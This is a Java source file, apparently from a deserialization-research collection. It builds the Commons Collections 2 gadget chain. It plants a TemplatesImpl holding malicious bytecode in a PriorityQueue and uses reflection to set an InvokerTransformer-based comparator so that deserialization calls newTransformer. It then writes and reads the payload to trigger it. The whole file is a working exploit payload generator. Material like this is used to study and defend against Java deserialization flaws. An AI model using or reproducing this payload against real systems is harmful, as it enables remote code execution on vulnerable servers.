package org.su18.serialize.ysoserial.CommonCollections.CommonCollections2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @author su18
 */
public class CC2WithTemplatesImpl {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 初始化 PriorityQueue
		PriorityQueue<Object> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		Field field = PriorityQueue.class.getDeclaredField("queue");
		field.setAccessible(true);
		Object[] objects = (Object[]) field.get(queue);
		objects[0] = tmpl;

		// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
		// 这个类是 public 的，方便调用
		Transformer            transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
		TransformingComparator comparator  = new TransformingComparator(transformer);

		Field field2 = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field2.setAccessible(true);
		field2.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue);
		SerializeUtil.readFileObject();

	}

}
